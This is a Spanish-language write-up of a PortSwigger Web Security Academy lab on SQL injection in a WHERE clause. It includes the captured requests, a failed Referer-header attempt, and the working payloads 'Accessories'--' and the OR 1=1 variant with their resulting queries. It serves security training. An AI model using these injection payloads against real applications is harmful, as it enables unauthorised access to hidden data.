# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

## 1. Información general

| Campo | Detalle |
| --- | --- |
| Plataforma | PortSwigger Web Security Academy |
| Learning Path | SQL Injection |
| Categoría | SQL Injection en cláusula `WHERE` |
| Dificultad | Apprentice / Basic |
| Herramienta principal | Burp Suite Community Edition |
| Estado | Resuelto |
| Objetivo | Mostrar productos ocultos/no publicados modificando la lógica SQL del filtro de categorías |

---

## 2. Objetivo del laboratorio

El laboratorio contiene una vulnerabilidad de **SQL Injection** en el filtro de categorías de productos.

Cuando el usuario selecciona una categoría, la aplicación ejecuta una consulta similar a:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

El objetivo es modificar la petición HTTP para lograr que la aplicación muestre productos no publicados, es decir, productos que normalmente no deberían mostrarse porque no cumplen la condición:

```sql
released = 1
```

---

## 3. Concepto técnico

La vulnerabilidad ocurre cuando una aplicación construye consultas SQL concatenando directamente datos controlados por el usuario sin validación ni parametrización adecuada.

En este caso, el parámetro vulnerable es:

```
category
```

La aplicación toma el valor de `category` y lo inserta dentro de la cláusula `WHERE` de la consulta SQL.

Consulta esperada:

```sql
SELECT * FROM products WHERE category = 'Accessories' AND released = 1
```

El usuario no controla directamente el campo `released`, pero sí puede modificar el parámetro `category` para alterar la lógica de la consulta y neutralizar la condición:

```sql
AND released = 1
```

---

## 4. Reconocimiento inicial

### Funcionalidad analizada

La funcionalidad vulnerable corresponde al filtro de categorías de productos.

Desde la interfaz web, el usuario puede seleccionar categorías como:

- `Accessories`
- `Food & Drink`
- `Gifts`
- `Lifestyle`

Al seleccionar una categoría, la aplicación realiza una petición HTTP hacia el endpoint `/filter`.

---

## 5. Request original

Petición capturada desde Burp Suite:

```
GET /filter?category=Accessories HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=[REDACTED]
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: <https://LAB-ID.web-security-academy.net/filter?category=Accessories>
```

El parámetro relevante es:

```
category=Accessories
```

Este valor parece ser utilizado por el servidor para construir la siguiente consulta:

```sql
SELECT * FROM products WHERE category = 'Accessories' AND released = 1
```

---

## 6. Hipótesis de explotación

Si el parámetro `category` se concatena directamente dentro de la consulta SQL, entonces es posible cerrar la cadena SQL con una comilla simple (`'`) y comentar el resto de la consulta.

La condición que se busca neutralizar es:

```sql
AND released = 1
```

Para lograrlo, se puede inyectar un comentario SQL después del valor de la categoría.

---

## 7. Pruebas realizadas

| # | Prueba | Payload / Modificación | Resultado | Interpretación |
| --- | --- | --- | --- | --- |
| 1 | Modificación del header `Referer` | `Referer: /filter?category=Accessories'--` | HTTP 200, sin cambios visibles | El servidor no utiliza el header `Referer` para construir la consulta vulnerable |
| 2 | Modificación del parámetro `category` en la línea GET | `/filter?category=Accessories'--` | Se muestran productos adicionales | La condición `AND released = 1` fue comentada correctamente |
| 3 | Uso de condición siempre verdadera | `/filter?category=Accessories' OR 1=1--` | Se muestran más productos de distintas categorías | `OR 1=1` fuerza que la condición sea verdadera y amplía los resultados |

---

## 8. Error identificado durante la prueba

En el primer intento, la inyección fue aplicada dentro del header:

```
Referer: <https://LAB-ID.web-security-academy.net/filter?category=Accessories>
```

Aunque la respuesta HTTP fue exitosa, no hubo cambios en los resultados mostrados por la aplicación.

Esto ocurrió porque la aplicación no estaba utilizando el valor del header `Referer` para construir la consulta SQL vulnerable.

El punto correcto de modificación era la línea principal de la petición HTTP:

```
GET /filter?category=Accessories HTTP/2
```

Este aprendizaje es importante porque en pruebas reales no basta con modificar cualquier aparición del parámetro. Es necesario identificar cuál valor es procesado por la lógica del servidor.

---

## 9. Explotación final

### Payload utilizado

```
Accessories'--
```

Versión recomendada con URL encoding:

```
Accessories%27--+
```

### Request final

```
GET /filter?category=Accessories%27--+ HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=[REDACTED]
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
```

---

## 10. Consulta SQL resultante

Consulta original esperada:

```sql
SELECT * FROM products WHERE category = 'Accessories' AND released = 1
```

Consulta modificada por la inyección:

```sql
SELECT * FROM products WHERE category = 'Accessories'--' AND released = 1
```

La secuencia `--` comenta el resto de la consulta SQL, por lo que esta parte deja de ejecutarse:

```sql
AND released = 1
```

Como resultado, la aplicación muestra productos de la categoría `Accessories` aunque no estén marcados como publicados.

---

## 11. Variante con condición siempre verdadera

También se validó una variante usando una condición lógica siempre verdadera:

```
Accessories' OR 1=1--
```

Versión URL encoded:

```
Accessories%27+OR+1%3D1--+
```

Consulta resultante conceptual:

```sql
SELECT * FROM products WHERE category = 'Accessories' OR 1=1--' AND released = 1
```

En este caso, la expresión:

```sql
OR 1=1
```

hace que la condición del `WHERE` siempre sea verdadera, por lo que la aplicación puede devolver productos de múltiples categorías, incluyendo productos ocultos o no publicados.

---

## 12. Resultado obtenido

El laboratorio fue resuelto exitosamente.

La aplicación mostró productos que originalmente no estaban visibles debido al filtro:

```sql
released = 1
```

Esto confirma que fue posible alterar la lógica SQL de la consulta mediante el parámetro `category`.

---

## 13. Conclusión

Este laboratorio demuestra una SQL Injection básica pero fundamental en una cláusula `WHERE`.

El aprendizaje principal es que una inyección exitosa no requiere controlar directamente todos los campos de una consulta. Basta con controlar un punto anterior de la lógica SQL para alterar el comportamiento completo de la consulta.

En este caso, al controlar el parámetro `category`, fue posible comentar la condición `AND released = 1` y hacer que la aplicación mostrara productos no publicados.

Este patrón es esencial para entender vulnerabilidades de SQL Injection en aplicaciones web reales, especialmente aquellas que utilizan filtros, búsquedas, categorías o parámetros dinámicos en consultas SQL.
